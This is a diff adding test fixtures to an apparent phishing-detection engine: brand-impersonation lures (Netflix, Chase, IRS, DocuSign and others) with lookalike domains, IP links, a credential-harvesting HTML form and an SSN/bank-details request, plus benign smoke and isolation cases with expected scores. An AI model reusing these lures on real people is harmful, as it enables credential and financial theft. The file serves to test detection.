@@ -265,6 +265,380 @@ PHISHING_HIDDEN_URL = {
 }
 
 
+PHISHING_NETFLIX_PAYMENT_HOLD = {
+    "label": "Mass phishing — Netflix billing hold, cousin domain, urgency, auth fail",
+    "tags": ["spoofed_sender", "cousin_domain", "auth_fail", "urgency", "credential_ask"],
+    "expected": {
+        "verdict": Verdict.MALICIOUS,
+        "min_score": 65,
+    },
+    "email": _email(
+        message_id="phish-005",
+        sender_address="billing@netflix-account-hold.com",
+        sender_display_name="Netflix Billing",
+        recipient="subscriber@example.com",
+        subject="We're having trouble with your current billing information",
+        date="2026-05-02T08:15:00+00:00",
+        body_text=(
+            "Hi,\n\n"
+            "We were unable to validate your billing information for the next "
+            "billing cycle of your subscription. Your account will be suspended "
+            "within 24 hours unless you update your payment information.\n\n"
+            "Please update your payment: https://netflix-account-hold.com/billing/restart\n\n"
+            "Need help? We're here for you.\n\n"
+            "— Netflix"
+        ),
+        body_html=(
+            "<html><body style='font-family:Arial,sans-serif;color:#222'>"
+            "<h2 style='color:#E50914'>NETFLIX</h2>"
+            "<p>We were unable to validate your billing information.</p>"
+            "<p><b>Your account will be suspended within 24 hours</b> unless you "
+            "update your payment information.</p>"
+            '<p><a href="https://netflix-account-hold.com/billing/restart" '
+            'style="background:#E50914;color:#fff;padding:10px 18px;text-decoration:none;'
+            'border-radius:4px">Restart Membership</a></p>'
+            "</body></html>"
+        ),
+        headers=[
+            {"name": "From", "value": "Netflix <billing@netflix-account-hold.com>"},
+            {"name": "Authentication-Results", "value": (
+                "mx.example.com; spf=fail smtp.mailfrom=netflix-account-hold.com; "
+                "dkim=fail header.d=netflix-account-hold.com; "
+                "dmarc=fail header.from=netflix-account-hold.com"
+            )},
+        ],
+    ),
+}
+
+PHISHING_FEDEX_DELIVERY_FEE = {
+    "label": "Mass phishing — FedEx undelivered package + small fee, cousin domain, IP URL",
+    "tags": ["spoofed_sender", "cousin_domain", "ip_url", "auth_fail", "urgency"],
+    "expected": {
+        "verdict": Verdict.MALICIOUS,
+        "min_score": 65,
+    },
+    "email": _email(
+        message_id="phish-006",
+        sender_address="tracking@fedex-redelivery.com",
+        sender_display_name="FedEx Delivery Services",
+        recipient="recipient@example.com",
+        subject="Action Required: Package #FX-77820 could not be delivered",
+        date="2026-05-02T09:00:00+00:00",
+        body_text=(
+            "Dear customer,\n\n"
+            "We attempted to deliver your package today but no one was available "
+            "to receive it. A redelivery fee of $2.99 is required to schedule "
+            "another attempt within 24 hours.\n\n"
+            "Pay the fee and reschedule: http://198.51.100.61/fedex-redeliver\n\n"
+            "FedEx Delivery Services"
+        ),
+        body_html=(
+            "<html><body>"
+            "<p><b>FedEx</b> Delivery Notification</p>"
+            "<p>Tracking #FX-77820 — delivery attempt failed.</p>"
+            '<p><a href="http://198.51.100.61/fedex-redeliver">Reschedule delivery</a></p>'
+            "</body></html>"
+        ),
+        headers=[
+            {"name": "From", "value": "FedEx <tracking@fedex-redelivery.com>"},
+            {"name": "Authentication-Results", "value": (
+                "mx.example.com; spf=fail smtp.mailfrom=fedex-redelivery.com; "
+                "dkim=none; dmarc=fail header.from=fedex-redelivery.com"
+            )},
+        ],
+    ),
+}
+
+PHISHING_INSTAGRAM_LOGIN_ALERT = {
+    "label": "Mass phishing — Instagram suspicious login, typosquat (1nstagram), credential ask",
+    "tags": ["spoofed_sender", "cousin_domain", "auth_fail", "credential_ask"],
+    "expected": {
+        "verdict": Verdict.MALICIOUS,
+        "min_score": 65,
+    },
+    "email": _email(
+        message_id="phish-007",
+        sender_address="security@1nstagram-help.com",
+        sender_display_name="Instagram Security",
+        recipient="user@example.com",
+        subject="Suspicious login attempt — confirm it's you",
+        date="2026-05-02T11:40:00+00:00",
+        body_text=(
+            "Hi,\n\n"
+            "We detected a suspicious login attempt on your account from a new "
+            "device in Lagos, Nigeria. If this wasn't you, please verify your "
+            "password immediately to keep your account secure.\n\n"
+            "Verify your account: https://1nstagram-help.com/login/verify\n\n"
+            "— Instagram Security"
+        ),
+        body_html=(
+            "<html><body>"
+            "<h3>Instagram</h3>"
+            "<p>We detected a suspicious login attempt.</p>"
+            "<p>If this wasn't you, please verify your password immediately.</p>"
+            '<p><a href="https://1nstagram-help.com/login/verify">Secure account</a></p>'
+            "</body></html>"
+        ),
+        headers=[
+            {"name": "From", "value": "Instagram <security@1nstagram-help.com>"},
+            {"name": "Authentication-Results", "value": (
+                "mx.example.com; spf=fail smtp.mailfrom=1nstagram-help.com; "
+                "dkim=fail header.d=1nstagram-help.com; "
+                "dmarc=fail header.from=1nstagram-help.com"
+            )},
+        ],
+    ),
+}
+
+PHISHING_DROPBOX_SHARED_FILE = {
+    "label": "Mass phishing — fake Dropbox shared file, typosquat (dr0pbox), credential ask",
+    "tags": ["spoofed_sender", "cousin_domain", "auth_fail", "credential_ask"],
+    "expected": {
+        "verdict": Verdict.MALICIOUS,
+        "min_score": 65,
+    },
+    "email": _email(
+        message_id="phish-008",
+        sender_address="no-reply@dr0pbox-share.com",
+        sender_display_name="Dropbox",
+        recipient="colleague@targetcorp.com",
+        subject="Sarah shared 'Q2_Forecast.xlsx' with you",
+        date="2026-05-02T13:20:00+00:00",
+        body_text=(
+            "Sarah Mitchell shared a file with you on Dropbox.\n\n"
+            "Q2_Forecast.xlsx (412 KB)\n\n"
+            "Sign in to verify your account and view this file:\n"
+            "https://dr0pbox-share.com/auth/login?next=q2-forecast\n\n"
+            "Happy collaborating,\nThe Dropbox team"
+        ),
+        body_html=(
+            "<html><body>"
+            "<p><b>Dropbox</b></p>"
+            "<p>Sarah shared <b>Q2_Forecast.xlsx</b> with you.</p>"
+            '<p><a href="https://dr0pbox-share.com/auth/login?next=q2-forecast" '
+            'style="background:#0061FF;color:#fff;padding:10px 18px;text-decoration:none">'
+            "Sign in to view</a></p>"
+            "</body></html>"
+        ),
+        headers=[
+            {"name": "From", "value": "Dropbox <no-reply@dr0pbox-share.com>"},
+            {"name": "Authentication-Results", "value": (
+                "mx.targetcorp.com; spf=fail smtp.mailfrom=dr0pbox-share.com; "
+                "dkim=fail header.d=dr0pbox-share.com; "
+                "dmarc=fail header.from=dr0pbox-share.com"
+            )},
+        ],
+    ),
+}
+
+PHISHING_IRS_TAX_REFUND = {
+    "label": "Phishing — fake IRS tax refund from freemail, sensitive data ask",
+    "tags": ["spoofed_sender", "freemail", "impersonation", "credential_ask", "urgency", "language_only"],
+    # Auth passes (real gmail.com), sender is freemail (no cousin), no URLs,
+    # no HTML form. The attack lives entirely in body language. Deterministic
+    # analyzers correctly return SAFE; LanguageAssessmentAnalyzer is the
+    # detection path for this pattern.
+    "expected": {
+        "verdict": Verdict.SAFE,
+        "max_score": 14,
+    },
+    "email": _email(
+        message_id="phish-009",
+        sender_address="irs.refund.dept2026@gmail.com",
+        sender_display_name="IRS Refund Department",
+        recipient="taxpayer@example.com",
+        subject="IRS Tax Refund — $1,247.83 ready for direct deposit",
+        date="2026-05-02T07:10:00+00:00",
+        body_text=(
+            "INTERNAL REVENUE SERVICE\n"
+            "Refund Notification\n\n"
+            "Our records show that you are eligible for a federal tax refund of "
+            "$1,247.83 for tax year 2025. To receive your refund, please verify "
+            "your bank account details within 48 hours.\n\n"
+            "Reply to this email with:\n"
+            "  • Full name\n"
+            "  • Social security number\n"
+            "  • Bank routing and account number\n\n"
+            "Failure to respond will result in forfeiture of the refund.\n\n"
+            "IRS Refund Department"
+        ),
+        body_html="",
+        headers=[
+            {"name": "From", "value": "IRS Refund Department <irs.refund.dept2026@gmail.com>"},
+            {"name": "Authentication-Results", "value": (
+                "mx.example.com; spf=pass smtp.mailfrom=gmail.com; "
+                "dkim=pass header.d=gmail.com; dmarc=pass header.from=gmail.com"
+            )},
+        ],
+    ),
+}
+
+PHISHING_LINKEDIN_INMAIL = {
+    "label": "Mass phishing — fake LinkedIn InMail, typosquat (linked1n), credential ask",
+    "tags": ["spoofed_sender", "cousin_domain", "auth_fail", "credential_ask"],
+    "expected": {
+        "verdict": Verdict.MALICIOUS,
+        "min_score": 65,
+    },
+    "email": _email(
+        message_id="phish-010",
+        sender_address="messaging-noreply@linked1n-careers.com",
+        sender_display_name="LinkedIn",
+        recipient="member@example.com",
+        subject="You have a new InMail from a recruiter",
+        date="2026-05-02T16:00:00+00:00",
+        body_text=(
+            "Hi,\n\n"
+            "A recruiter from a Fortune 500 company has sent you an InMail "
+            "regarding a senior role. Sign in to verify your account and read "
+            "the message:\n\n"
+            "https://linked1n-careers.com/messages/inmail/8821\n\n"
+            "— LinkedIn"
+        ),
+        body_html=(
+            "<html><body>"
+            "<p><b>LinkedIn</b></p>"
+            "<p>You have a new InMail from a recruiter at a Fortune 500 company.</p>"
+            '<p><a href="https://linked1n-careers.com/messages/inmail/8821">Read InMail</a></p>'
+            "</body></html>"
+        ),
+        headers=[
+            {"name": "From", "value": "LinkedIn <messaging-noreply@linked1n-careers.com>"},
+            {"name": "Authentication-Results", "value": (
+                "mx.example.com; spf=fail smtp.mailfrom=linked1n-careers.com; "
+                "dkim=fail header.d=linked1n-careers.com; "
+                "dmarc=fail header.from=linked1n-careers.com"
+            )},
+        ],
+    ),
+}
+
+PHISHING_CHASE_BANK_LOCKOUT = {
+    "label": "Mass phishing — Chase bank lockout, cousin domain + IP URL + urgency",
+    "tags": ["spoofed_sender", "cousin_domain", "ip_url", "auth_fail", "urgency", "credential_ask", "threat"],
+    "expected": {
+        "verdict": Verdict.MALICIOUS,
+        "min_score": 80,
+    },
+    "email": _email(
+        message_id="phish-011",
+        sender_address="alerts@chase-online-secure.com",
+        sender_display_name="Chase Online Banking",
+        recipient="customer@example.com",
+        subject="Your account has been locked due to unusual activity",
+        date="2026-05-02T05:45:00+00:00",
+        body_text=(
+            "Dear Customer,\n\n"
+            "We detected unauthorized activity on your Chase account. Your "
+            "account has been locked. Please verify your identity immediately "
+            "to restore access — failure to respond will result in permanent "
+            "closure within 24 hours.\n\n"
+            "Verify now: http://203.0.113.205/chase/secure-restore\n\n"
+            "Chase Online Security"
+        ),
+        body_html=(
+            "<html><body>"
+            "<h2 style='color:#117ACA'>Chase</h2>"
+            "<p>We detected unauthorized activity on your account.</p>"
+            "<p><b>Your account has been locked</b>. Please verify your identity "
+            "immediately or your account will be permanently closed within 24 hours.</p>"
+            '<p><a href="http://203.0.113.205/chase/secure-restore" '
+            'style="background:#117ACA;color:#fff;padding:10px 18px;text-decoration:none">'
+            "Verify identity</a></p>"
+            "</body></html>"
+        ),
+        headers=[
+            {"name": "From", "value": "Chase <alerts@chase-online-secure.com>"},
+            {"name": "Authentication-Results", "value": (
+                "mx.example.com; spf=fail smtp.mailfrom=chase-online-secure.com; "
+                "dkim=fail header.d=chase-online-secure.com; "
+                "dmarc=fail header.from=chase-online-secure.com"
+            )},
+        ],
+    ),
+}
+
+PHISHING_SPOTIFY_PAYMENT_FAILED = {
+    "label": "Mass phishing — Spotify payment failure, typosquat (sp0tify), urgency",
+    "tags": ["spoofed_sender", "cousin_domain", "auth_fail", "urgency"],
+    "expected": {
+        "verdict": Verdict.MALICIOUS,
+        "min_score": 65,
+    },
+    "email": _email(
+        message_id="phish-012",
+        sender_address="no-reply@sp0tify-billing.com",
+        sender_display_name="Spotify",
+        recipient="listener@example.com",
+        subject="We could not process your payment — update payment information",
+        date="2026-05-02T19:30:00+00:00",
+        body_text=(
+            "Hi,\n\n"
+            "Your last payment for Spotify Premium failed. To avoid service "
+            "interruption, please update your payment information within 48 hours.\n\n"
+            "Update payment: https://sp0tify-billing.com/account/payment\n\n"
+            "Cheers,\nThe Spotify team"
+        ),
+        body_html=(
+            "<html><body style='font-family:Arial,sans-serif;color:#191414'>"
+            "<h2 style='color:#1DB954'>Spotify</h2>"
+            "<p>Your last payment failed. <b>Service interruption</b> within 48 hours "
+            "if not resolved.</p>"
+            '<p><a href="https://sp0tify-billing.com/account/payment" '
+            'style="background:#1DB954;color:#fff;padding:10px 18px;text-decoration:none;'
+            'border-radius:20px">Update payment</a></p>'
+            "</body></html>"
+        ),
+        headers=[
+            {"name": "From", "value": "Spotify <no-reply@sp0tify-billing.com>"},
+            {"name": "Authentication-Results", "value": (
+                "mx.example.com; spf=fail smtp.mailfrom=sp0tify-billing.com; "
+                "dkim=fail header.d=sp0tify-billing.com; "
+                "dmarc=fail header.from=sp0tify-billing.com"
+            )},
+        ],
+    ),
+}
+
+PHISHING_DOCUSIGN_LOOKALIKE = {
+    "label": "Mass phishing — fake DocuSign signature request with HTML form harvest",
+    "tags": ["spoofed_sender", "auth_fail", "html_form", "credential_ask"],
+    "expected": {
+        "verdict": Verdict.MALICIOUS,
+        "min_score": 65,
+    },
+    "email": _email(
+        message_id="phish-013",
+        sender_address="alerts@docusign-secure-portal.com",
+        sender_display_name="DocuSign",
+        recipient="signer@targetcorp.com",
+        subject="Please review and sign: Vendor Agreement #VA-2026-44871",
+        date="2026-05-02T14:55:00+00:00",
+        body_text="A document is awaiting your signature. (View HTML to sign.)",
+        body_html=(
+            "<html><body>"
+            "<h3>DocuSign — Document for your signature</h3>"
+            "<p>A vendor agreement is awaiting your signature.</p>"
+            "<p>Confirm your identity to view and sign:</p>"
+            '<form action="https://docusign-secure-portal.com/auth/collect" method="POST">'
+            '<label>Email:</label><input type="text" name="email"><br>'
+            '<label>Password:</label><input type="password" name="password"><br>'
+            '<input type="submit" value="Continue to document">'
+            "</form>"
+            "</body></html>"
+        ),
+        headers=[
+            {"name": "From", "value": "DocuSign <alerts@docusign-secure-portal.com>"},
+            {"name": "Authentication-Results", "value": (
+                "mx.targetcorp.com; spf=fail smtp.mailfrom=docusign-secure-portal.com; "
+                "dkim=fail header.d=docusign-secure-portal.com; "
+                "dmarc=fail header.from=docusign-secure-portal.com"
+            )},
+        ],
+    ),
+}
+
+
 # ═══════════════════════════════════════════════════════════════════════════
 #  2. SPEAR PHISHING / TARGETED
 # ═══════════════════════════════════════════════════════════════════════════
@@ -1584,6 +1958,1326 @@ CREDENTIAL_PHISH_OAUTH = {
 
 
 # ═══════════════════════════════════════════════════════════════════════════
+#  11. SIMPLE SMOKE CHECKS — bare-minimum SAFE inputs
+#       Purpose: verify the engine returns SAFE on inputs that exercise zero
+#       analyzers. Useful as quick sanity tests before any rule change.
+# ═══════════════════════════════════════════════════════════════════════════
+
+SIMPLE_PLAIN_TEXT_HELLO = {
+    "label": "Smoke — bare two-line email, no headers, no html",
+    "tags": ["smoke", "legitimate", "empty_body"],
+    "expected": {
+        "verdict": Verdict.SAFE,
+        "max_score": 14,
+    },
+    "email": _email(
+        message_id="smoke-001",
+        sender_address="someone@example.com",
+        recipient="user@example.com",
+        subject="Hi",
+        body_text="Hey, just checking in. Talk later.",
+    ),
+}
+
+SIMPLE_AUTH_PASS_TRANSACTIONAL = {
+    "label": "Smoke — auth pass, plain receipt, no signals",
+    "tags": ["smoke", "legitimate", "transactional", "auth_pass"],
+    "expected": {
+        "verdict": Verdict.SAFE,
+        "max_score": 14,
+    },
+    "email": _email(
+        message_id="smoke-002",
+        sender_address="receipts@stripe.com",
+        recipient="customer@example.com",
+        subject="Receipt for your payment",
+        body_text=(
+            "Thanks for your payment of $19.99 on May 1, 2026.\n"
+            "Reference: pi_3MZ8pH2eZvKYlo2C0vJqXqX9\n"
+            "View receipt at https://dashboard.stripe.com/receipts/abc"
+        ),
+        headers=[
+            {"name": "From", "value": "receipts@stripe.com"},
+            {"name": "Authentication-Results", "value": (
+                "mx.example.com; spf=pass smtp.mailfrom=stripe.com; "
+                "dkim=pass header.d=stripe.com; dmarc=pass header.from=stripe.com"
+            )},
+        ],
+    ),
+}
+
+SIMPLE_INTERNAL_REPLY = {
+    "label": "Smoke — colleague reply on same domain, auth pass",
+    "tags": ["smoke", "legitimate", "internal", "auth_pass"],
+    "expected": {
+        "verdict": Verdict.SAFE,
+        "max_score": 14,
+    },
+    "email": _email(
+        message_id="smoke-003",
+        sender_address="bob@targetcorp.com",
+        recipient="alice@targetcorp.com",
+        subject="Re: lunch",
+        body_text="Sure — see you at noon.",
+        headers=[
+            {"name": "From", "value": "bob@targetcorp.com"},
+            {"name": "In-Reply-To", "value": "<thread-1@targetcorp.com>"},
+            {"name": "Authentication-Results", "value": (
+                "mx.targetcorp.com; spf=pass smtp.mailfrom=targetcorp.com; "
+                "dkim=pass header.d=targetcorp.com; dmarc=pass header.from=targetcorp.com"
+            )},
+        ],
+    ),
+}
+
+SIMPLE_LINKEDIN_NOTIFICATION = {
+    "label": "Smoke — LinkedIn connection notification, valid auth",
+    "tags": ["smoke", "legitimate", "transactional", "auth_pass"],
+    "expected": {
+        "verdict": Verdict.SAFE,
+        "max_score": 14,
+    },
+    "email": _email(
+        message_id="smoke-004",
+        sender_address="messages-noreply@linkedin.com",
+        recipient="user@example.com",
+        subject="You have a new connection request",
+        body_text=(
+            "Carla Mendez wants to connect on LinkedIn.\n"
+            "View profile: https://www.linkedin.com/in/carla-mendez-5678"
+        ),
+        headers=[
+            {"name": "From", "value": "LinkedIn <messages-noreply@linkedin.com>"},
+            {"name": "List-Unsubscribe", "value": "<https://www.linkedin.com/comm/unsub>"},
+            {"name": "Authentication-Results", "value": (
+                "mx.example.com; spf=pass smtp.mailfrom=linkedin.com; "
+                "dkim=pass header.d=linkedin.com; dmarc=pass header.from=linkedin.com"
+            )},
+        ],
+    ),
+}
+
+SIMPLE_DOCUSIGN_REQUEST = {
+    "label": "Smoke — DocuSign signature request from real domain",
+    "tags": ["smoke", "legitimate", "transactional", "auth_pass"],
+    "expected": {
+        "verdict": Verdict.SAFE,
+        "max_score": 14,
+    },
+    "email": _email(
+        message_id="smoke-005",
+        sender_address="dse_NA4@docusign.net",
+        recipient="signer@example.com",
+        subject="Please DocuSign: NDA - Vendor Agreement",
+        body_text=(
+            "Carla has sent you a document to review and sign.\n"
+            "Review document: https://app.docusign.com/documents/abc123"
+        ),
+        headers=[
+            {"name": "From", "value": "DocuSign EU <dse_NA4@docusign.net>"},
+            {"name": "Authentication-Results", "value": (
+                "mx.example.com; spf=pass smtp.mailfrom=docusign.net; "
+                "dkim=pass header.d=docusign.net; dmarc=pass header.from=docusign.net"
+            )},
+        ],
+    ),
+}
+
+SIMPLE_CALENDAR_REMINDER = {
+    "label": "Smoke — Google Calendar reminder, internal recipient",
+    "tags": ["smoke", "legitimate", "calendar", "auth_pass"],
+    "expected": {
+        "verdict": Verdict.SAFE,
+        "max_score": 14,
+    },
+    "email": _email(
+        message_id="smoke-006",
+        sender_address="calendar-notification@google.com",
+        recipient="user@targetcorp.com",
+        subject="Reminder: Standup at 10:00 AM",
+        body_text="Reminder: Standup tomorrow at 10:00 AM. Conference Room A.",
+        headers=[
+            {"name": "From", "value": "Google Calendar <calendar-notification@google.com>"},
+            {"name": "Authentication-Results", "value": (
+                "mx.targetcorp.com; spf=pass smtp.mailfrom=google.com; "
+                "dkim=pass header.d=google.com; dmarc=pass header.from=google.com"
+            )},
+        ],
+    ),
+}
+
+SIMPLE_PR_MERGE_NOTIFICATION = {
+    "label": "Smoke — GitHub PR merged notification",
+    "tags": ["smoke", "legitimate", "transactional", "auth_pass"],
+    "expected": {
+        "verdict": Verdict.SAFE,
+        "max_score": 14,
+    },
+    "email": _email(
+        message_id="smoke-007",
+        sender_address="notifications@github.com",
+        recipient="developer@example.com",
+        subject="[myorg/myrepo] Pull request #401 merged",
+        body_text=(
+            "Pull request #401 'Refactor scoring tier thresholds' "
+            "has been merged into main."
+        ),
+        headers=[
+            {"name": "From", "value": "GitHub <notifications@github.com>"},
+            {"name": "Authentication-Results", "value": (
+                "mx.example.com; spf=pass smtp.mailfrom=github.com; "
+                "dkim=pass header.d=github.com; dmarc=pass header.from=github.com"
+            )},
+        ],
+    ),
+}
+
+SIMPLE_AWS_BILLING_RECEIPT = {
+    "label": "Smoke — AWS billing receipt, plain text",
+    "tags": ["smoke", "legitimate", "transactional", "auth_pass"],
+    "expected": {
+        "verdict": Verdict.SAFE,
+        "max_score": 14,
+    },
+    "email": _email(
+        message_id="smoke-008",
+        sender_address="billing@amazonaws.com",
+        recipient="finance@example.com",
+        subject="Your AWS bill for April 2026",
+        body_text=(
+            "Your AWS bill for April 2026 is $124.83.\n"
+            "Manage billing at https://console.aws.amazon.com/billing/"
+        ),
+        headers=[
+            {"name": "From", "value": "billing@amazonaws.com"},
+            {"name": "Authentication-Results", "value": (
+                "mx.example.com; spf=pass smtp.mailfrom=amazonses.com; "
+                "dkim=pass header.d=amazon.com; dmarc=pass header.from=amazonaws.com"
+            )},
+        ],
+    ),
+}
+
+SIMPLE_SHORT_HTML_NEWSLETTER = {
+    "label": "Smoke — short HTML newsletter, valid ESP, no signals",
+    "tags": ["smoke", "legitimate", "newsletter", "auth_pass"],
+    "expected": {
+        "verdict": Verdict.SAFE,
+        "max_score": 14,
+    },
+    "email": _email(
+        message_id="smoke-009",
+        sender_address="news@bigshop.example.com",
+        recipient="reader@example.com",
+        subject="3 picks for you this week",
+        body_text="Top picks: cookware, towels, planters.",
+        body_html=(
+            "<html><body>"
+            "<h2>3 picks for you</h2>"
+            "<ul><li>Cookware</li><li>Towels</li><li>Planters</li></ul>"
+            '<p><a href="https://bigshop.example.com/picks">Browse picks</a></p>'
+            "</body></html>"
+        ),
+        headers=[
+            {"name": "From", "value": "BigShop <news@bigshop.example.com>"},
+            {"name": "List-Unsubscribe", "value": "<https://bigshop.example.com/unsub>"},
+            {"name": "Authentication-Results", "value": (
+                "mx.example.com; spf=pass smtp.mailfrom=sendgrid.net; "
+                "dkim=pass header.d=bigshop.example.com; dmarc=pass header.from=bigshop.example.com"
+            )},
+        ],
+        return_path_address="bounce@em.sendgrid.net",
+    ),
+}
+
+SIMPLE_TWO_LINE_AUTOREPLY = {
+    "label": "Smoke — out-of-office autoreply, freemail, no display name",
+    "tags": ["smoke", "legitimate", "freemail", "auth_pass"],
+    "expected": {
+        "verdict": Verdict.SAFE,
+        "max_score": 14,
+    },
+    "email": _email(
+        message_id="smoke-010",
+        sender_address="contact@gmail.com",
+        recipient="someone@example.com",
+        subject="Out of office",
+        body_text="I am away until May 10. Will respond when I am back.",
+        headers=[
+            {"name": "From", "value": "contact@gmail.com"},
+            {"name": "Authentication-Results", "value": (
+                "mx.example.com; spf=pass smtp.mailfrom=gmail.com; "
+                "dkim=pass header.d=gmail.com; dmarc=pass header.from=gmail.com"
+            )},
+        ],
+    ),
+}
+
+
+# ═══════════════════════════════════════════════════════════════════════════
+#  12. ANALYZER ISOLATION — single-signal fixtures, one analyzer at a time
+#       Each fixture isolates ONE analyzer's output so per-analyzer changes
+#       can be validated without crosstalk.
+# ═══════════════════════════════════════════════════════════════════════════
+
+# ----- Authentication isolation -----
+
+AUTH_DMARC_FAIL_ONLY = {
+    "label": "Auth isolation — DMARC fail, otherwise clean (single CRITICAL → 35)",
+    "tags": ["auth_fail", "isolation"],
+    "expected": {
+        "verdict": Verdict.LIKELY_MALICIOUS,
+        "min_score": 35,
+        "max_score": 50,
+    },
+    "email": _email(
+        message_id="auth-iso-001",
+        sender_address="ops@reliable-vendor.example",
+        recipient="customer@example.com",
+        subject="Monthly status update",
+        body_text="Hi, here is our monthly status. Nothing notable. Thanks.",
+        headers=[
+            {"name": "From", "value": "ops@reliable-vendor.example"},
+            {"name": "Authentication-Results", "value": (
+                "mx.example.com; spf=pass smtp.mailfrom=reliable-vendor.example; "
+                "dkim=pass header.d=reliable-vendor.example; "
+                "dmarc=fail header.from=reliable-vendor.example"
+            )},
+        ],
+    ),
+}
+
+AUTH_SPF_SOFTFAIL_ONLY = {
+    "label": "Auth isolation — SPF softfail only (HIGH×0.7 → ~15 pts SUSPICIOUS)",
+    "tags": ["auth_fail", "isolation"],
+    "expected": {
+        "verdict": Verdict.SUSPICIOUS,
+        "min_score": 15,
+        "max_score": 34,
+    },
+    "email": _email(
+        message_id="auth-iso-002",
+        sender_address="updates@small-vendor.example",
+        recipient="user@example.com",
+        subject="Schedule update",
+        body_text="Heads up — we are pushing the schedule by a day.",
+        headers=[
+            {"name": "From", "value": "updates@small-vendor.example"},
+            {"name": "Authentication-Results", "value": (
+                "mx.example.com; spf=softfail smtp.mailfrom=small-vendor.example; "
+                "dkim=pass header.d=small-vendor.example; "
+                "dmarc=pass header.from=small-vendor.example"
+            )},
+        ],
+    ),
+}
+
+AUTH_SPF_NONE_BLINDSPOT = {
+    "label": "Auth isolation — SPF=none (blind spot + LOW signal, expect SAFE)",
+    "tags": ["auth_blindspot", "isolation"],
+    "expected": {
+        "verdict": Verdict.SAFE,
+        "max_score": 14,
+    },
+    "email": _email(
+        message_id="auth-iso-003",
+        sender_address="info@quiet-corp.example",
+        recipient="reader@example.com",
+        subject="Hello",
+        body_text="Just saying hi from the team.",
+        headers=[
+            {"name": "From", "value": "info@quiet-corp.example"},
+            {"name": "Authentication-Results", "value": (
+                "mx.example.com; spf=none smtp.mailfrom=quiet-corp.example; "
+                "dkim=pass header.d=quiet-corp.example; dmarc=pass header.from=quiet-corp.example"
+            )},
+        ],
+    ),
+}
+
+AUTH_TEMPERROR_BLINDSPOT_ONLY = {
+    "label": "Auth isolation — DKIM=temperror (blind spot only, no signal)",
+    "tags": ["auth_blindspot", "isolation"],
+    "expected": {
+        "verdict": Verdict.SAFE,
+        "max_score": 14,
+    },
+    "email": _email(
+        message_id="auth-iso-004",
+        sender_address="alerts@niche-saas.example",
+        recipient="ops@example.com",
+        subject="Daily metric digest",
+        body_text="Today: 12,344 events, 0 errors.",
+        headers=[
+            {"name": "From", "value": "alerts@niche-saas.example"},
+            {"name": "Authentication-Results", "value": (
+                "mx.example.com; spf=pass smtp.mailfrom=niche-saas.example; "
+                "dkim=temperror header.d=niche-saas.example; "
+                "dmarc=pass header.from=niche-saas.example"
+            )},
+        ],
+    ),
+}
+
+AUTH_NO_HEADERS_BLINDSPOT = {
+    "label": "Auth isolation — no Authentication-Results header (pure blind spot)",
+    "tags": ["auth_blindspot", "isolation"],
+    "expected": {
+        "verdict": Verdict.SAFE,
+        "max_score": 14,
+    },
+    "email": _email(
+        message_id="auth-iso-005",
+        sender_address="someone@example.com",
+        recipient="other@example.com",
+        subject="Quick note",
+        body_text="Quick note — see you Monday.",
+        headers=[
+            {"name": "From", "value": "someone@example.com"},
+            {"name": "To", "value": "other@example.com"},
+        ],
+    ),
+}
+
+AUTH_DKIM_FAIL_ONLY = {
+    "label": "Auth isolation — DKIM fail only (HIGH/1.0 → 22 SUSPICIOUS)",
+    "tags": ["auth_fail", "isolation"],
+    "expected": {
+        "verdict": Verdict.SUSPICIOUS,
+        "min_score": 15,
+        "max_score": 34,
+    },
+    "email": _email(
+        message_id="auth-iso-006",
+        sender_address="news@medium-corp.example",
+        recipient="reader@example.com",
+        subject="This week in tech",
+        body_text="Highlights: AI, robotics, climate.",
+        headers=[
+            {"name": "From", "value": "news@medium-corp.example"},
+            {"name": "Authentication-Results", "value": (
+                "mx.example.com; spf=pass smtp.mailfrom=medium-corp.example; "
+                "dkim=fail header.d=medium-corp.example; "
+                "dmarc=pass header.from=medium-corp.example"
+            )},
+        ],
+    ),
+}
+
+
+# ----- URL structure isolation -----
+
+URL_IP_LITERAL_ONLY = {
+    "label": "URL isolation — single IP-literal link, otherwise clean",
+    "tags": ["ip_url", "isolation"],
+    "expected": {
+        "verdict": Verdict.SUSPICIOUS,
+        "min_score": 15,
+        "max_score": 34,
+    },
+    "email": _email(
+        message_id="url-iso-001",
+        sender_address="updates@news.example.com",
+        recipient="reader@example.com",
+        subject="Daily digest",
+        body_text=(
+            "Today's digest is available.\n"
+            "Read it: http://203.0.113.42/digest\n"
+        ),
+        headers=[
+            {"name": "From", "value": "updates@news.example.com"},
+            {"name": "Authentication-Results", "value": (
+                "mx.example.com; spf=pass smtp.mailfrom=news.example.com; "
+                "dkim=pass header.d=news.example.com; dmarc=pass header.from=news.example.com"
+            )},
+        ],
+    ),
+}
+
+URL_HREF_TEXT_MISMATCH_ONLY = {
+    "label": "URL isolation — display text vs href domain mismatch (CRITICAL → 35)",
+    "tags": ["url_mismatch", "isolation"],
+    "expected": {
+        "verdict": Verdict.LIKELY_MALICIOUS,
+        "min_score": 35,
+        "max_score": 50,
+    },
+    "email": _email(
+        message_id="url-iso-002",
+        sender_address="news@trusted-news.example",
+        recipient="reader@example.com",
+        subject="Daily news",
+        body_html=(
+            "<html><body>"
+            "<p>Read today's lead story:</p>"
+            '<p><a href="https://entirely-different-host.example/track">'
+            "https://www.bbc.co.uk/news</a></p>"
+            "</body></html>"
+        ),
+        headers=[
+            {"name": "From", "value": "news@trusted-news.example"},
+            {"name": "Authentication-Results", "value": (
+                "mx.example.com; spf=pass smtp.mailfrom=trusted-news.example; "
+                "dkim=pass header.d=trusted-news.example; "
+                "dmarc=pass header.from=trusted-news.example"
+            )},
+        ],
+    ),
+}
+
+URL_BARE_PLAIN_LINK_CLEAN = {
+    "label": "URL isolation — bare plain-text URL, no signals",
+    "tags": ["legitimate", "isolation"],
+    "expected": {
+        "verdict": Verdict.SAFE,
+        "max_score": 14,
+    },
+    "email": _email(
+        message_id="url-iso-003",
+        sender_address="docs@docs.example.com",
+        recipient="reader@example.com",
+        subject="Doc shared",
+        body_text="See: https://docs.example.com/q2-plan",
+        headers=[
+            {"name": "From", "value": "docs@docs.example.com"},
+            {"name": "Authentication-Results", "value": (
+                "mx.example.com; spf=pass smtp.mailfrom=docs.example.com; "
+                "dkim=pass header.d=docs.example.com; dmarc=pass header.from=docs.example.com"
+            )},
+        ],
+    ),
+}
+
+URL_HREF_MATCHING_DISPLAY_CLEAN = {
+    "label": "URL isolation — href domain matches display text, no signal",
+    "tags": ["legitimate", "isolation"],
+    "expected": {
+        "verdict": Verdict.SAFE,
+        "max_score": 14,
+    },
+    "email": _email(
+        message_id="url-iso-004",
